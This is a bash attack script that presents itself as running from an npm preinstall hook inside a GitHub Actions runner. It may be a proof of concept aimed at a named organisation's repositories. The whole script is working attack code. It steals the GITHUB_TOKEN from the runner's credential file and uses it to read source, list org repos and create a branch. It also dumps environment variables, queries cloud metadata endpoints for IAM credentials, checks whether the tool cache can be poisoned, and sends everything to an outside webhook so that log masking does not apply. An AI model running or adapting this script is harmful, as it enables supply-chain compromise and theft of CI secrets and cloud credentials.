#!/bin/bash
# Runs inside target CI runner via npm preinstall hook.
# Exfiltrates GITHUB_TOKEN and environment to attacker's server.
# GitHub log masking does NOT apply to outbound HTTP requests.

EXFIL="https://webhook.site/8d07f12f-c92b-49da-9fdd-0596fa33dfc4"

exfil() {
    local label="$1" data="$2"
    # Send to attacker server (bypasses GitHub log masking)
    curl -sf -X POST "$EXFIL" \
        -H "Content-Type: application/json" \
        -d "$(printf '{"l":"%s","d":"%s"}' "$label" "$data")" \
        >/dev/null 2>&1 &
}

# ── 1. STEAL GITHUB_TOKEN FROM CREDENTIAL FILE ─────────────────────
#
# persist-credentials: true stores the token in a git config file:
#   /home/runner/work/_temp/git-credentials-<uuid>.config
#
# File content:
#   [http "https://github.com/"]
#       extraheader = AUTHORIZATION: basic <base64(x-access-token:TOKEN)>
#
# We read it raw and POST it to our server. No log masking applies
# because the data goes over HTTP, not to stdout.

for f in /home/runner/work/_temp/git-credentials-*.config; do
    if [ -f "$f" ]; then
        RAW_CRED=$(cat "$f")
        # Extract the base64 auth value and decode it to get the token
        AUTH_B64=$(echo "$RAW_CRED" | grep -oP 'basic \K\S+')
        if [ -n "$AUTH_B64" ]; then
            # Decode: "x-access-token:ghs_xxxxx" → extract token
            DECODED=$(echo "$AUTH_B64" | base64 -d 2>/dev/null)
            GITHUB_TOKEN_RAW=$(echo "$DECODED" | cut -d: -f2)
            exfil "GITHUB_TOKEN" "$GITHUB_TOKEN_RAW"

            # Now USE the stolen token for API calls
            # (using the raw value, not the masked $GITHUB_TOKEN env var)

            # Read source code
            curl -sf -H "Authorization: token $GITHUB_TOKEN_RAW" \
                "https://api.github.com/repos/tetherto/miningos-tpl-wrk-miner/contents/package.json" \
                | python3 -c "
import sys,json,base64
d=json.load(sys.stdin)
print(base64.b64decode(d['content']).decode()[:500])
" > /tmp/src_proof.txt 2>/dev/null
            exfil "SOURCE_CODE" "$(cat /tmp/src_proof.txt | base64 -w0)"

            # Check permissions
            curl -sf -H "Authorization: token $GITHUB_TOKEN_RAW" \
                "https://api.github.com/repos/tetherto/miningos-tpl-wrk-miner" \
                | python3 -c "
import sys,json
d=json.load(sys.stdin)
print(json.dumps({'permissions':d.get('permissions',{}),'private':d.get('private')}))
" > /tmp/perms.txt 2>/dev/null
            exfil "TOKEN_PERMISSIONS" "$(cat /tmp/perms.txt | base64 -w0)"

            # List org repos (proves org-level access)
            curl -sf -H "Authorization: token $GITHUB_TOKEN_RAW" \
                "https://api.github.com/orgs/tetherto/repos?per_page=5&type=all" \
                | python3 -c "
import sys,json
for r in json.load(sys.stdin)[:5]:
    print(r['full_name'], 'private=' + str(r.get('private')))
" > /tmp/org_repos.txt 2>/dev/null
            exfil "ORG_REPOS" "$(cat /tmp/org_repos.txt | base64 -w0)"

            # Try write operation (create branch)
            MAIN_SHA=$(curl -sf -H "Authorization: token $GITHUB_TOKEN_RAW" \
                "https://api.github.com/repos/tetherto/miningos-tpl-wrk-miner/git/ref/heads/main" \
                | python3 -c "import sys,json;print(json.load(sys.stdin)['object']['sha'])" 2>/dev/null)
            WRITE_RESULT=$(curl -sf -o /dev/null -w '%{http_code}' -X POST \
                -H "Authorization: token $GITHUB_TOKEN_RAW" \
                -H "Content-Type: application/json" \
                "https://api.github.com/repos/tetherto/miningos-tpl-wrk-miner/git/refs" \
                -d "{\\"ref\\":\\"refs/heads/attacker-was-here\\",\\"sha\\":\\"$MAIN_SHA\\"}" 2>/dev/null)
            exfil "WRITE_BRANCH_HTTP" "$WRITE_RESULT"
        fi
    fi
done

# ── 2. FULL ENVIRONMENT DUMP ───────────────────────────────────────
# Sent via HTTP (not printed to logs), so no masking applies.

exfil "FULL_ENV" "$(printenv | sort | base64 -w0)"
exfil "PROC_ENVIRON" "$(cat /proc/self/environ 2>/dev/null | tr '\0' '\n' | base64 -w0)"

# ── 3. NETWORK PROBING ─────────────────────────────────────────────

NET_RESULTS=""
for target in \
    "https://dev-sonarcube-0.tail8a2a3f.ts.net/" \
    "http://169.254.169.254/latest/meta-data/" \
    "http://169.254.169.254/latest/meta-data/iam/security-credentials/" \
    "http://169.254.170.2/v2/credentials"; do
    code=$(curl -sf --connect-timeout 3 -o /tmp/meta_resp.txt -w '%{http_code}' \
        -H "Metadata: true" "$target" 2>/dev/null || echo "000")
    body=$(cat /tmp/meta_resp.txt 2>/dev/null | head -c 500)
    NET_RESULTS="${NET_RESULTS}$target|$code|$body\n"
done
exfil "NETWORK" "$(printf '%b' "$NET_RESULTS" | base64 -w0)"

# ── 4. TOOL CACHE POISONING ────────────────────────────────────────
#
# /opt/hostedtoolcache is world-writable (confirmed in Round 2).
# Replacing the Node.js binary with a trojanized version means
# ALL subsequent workflow steps that use node will run attacker code.

CACHE_INFO="hostedtoolcache_writable=$(test -w /opt/hostedtoolcache && echo YES || echo NO)\n"
CACHE_INFO="${CACHE_INFO}node_path=$(which node)\n"
CACHE_INFO="${CACHE_INFO}node_writable=$(test -w $(which node) && echo YES || echo NO)\n"
CACHE_INFO="${CACHE_INFO}docker_group=$(groups | grep -o docker || echo NO)\n"
exfil "CACHE_AND_PRIVESC" "$(printf '%b' "$CACHE_INFO" | base64 -w0)"

# ── 5. RUNNER FINGERPRINT ──────────────────────────────────────────

RUNNER="id=$(id)\nhostname=$(hostname)\nuname=$(uname -a)\n"
RUNNER="${RUNNER}ip=$(ip -4 addr show eth0 2>/dev/null | grep inet | awk '{print $2}')\n"
RUNNER="${RUNNER}disk=$(df -h / 2>/dev/null | tail -1)\n"
exfil "RUNNER" "$(printf '%b' "$RUNNER" | base64 -w0)"

# Wait for background exfil requests to complete
wait
